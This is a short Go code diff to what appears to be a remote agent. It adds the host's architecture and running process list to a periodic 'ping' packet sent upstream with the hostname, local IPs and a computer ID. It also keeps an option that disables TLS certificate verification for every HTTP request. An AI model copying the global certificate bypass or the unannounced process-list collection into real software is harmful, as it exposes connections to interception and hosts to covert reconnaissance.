@@ -37,7 +37,7 @@ func NewClient() Client {
 }
 
 func (s *Client) Start() {
-	if s.Config.insecureTls {
+	if s.Config.InsecureTls {
 		// Enable SkipVerify on all instances of http
 		// https://stackoverflow.com/questions/12122159/how-to-do-a-https-request-with-bad-certificate
 		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
@@ -69,9 +69,13 @@ func (s *Client) Start() {
 
 func (s *Client) sendPing() error {
 	arguments := make(model.PacketArgument)
+
 	response := make(model.PacketResponse)
 	response["hostname"] = s.Config.Hostname
 	model.AddArrayToResponse("localIp", s.Config.LocalIps, response)
+	response["arch"] = s.Config.Arch
+	model.AddArrayToResponse("processes", s.Config.Processes, response)
+
 	packet := model.NewPacket("ping", s.Config.ComputerId, "0", arguments, response)
 
 	err := s.Upstream.SendPacket(packet)
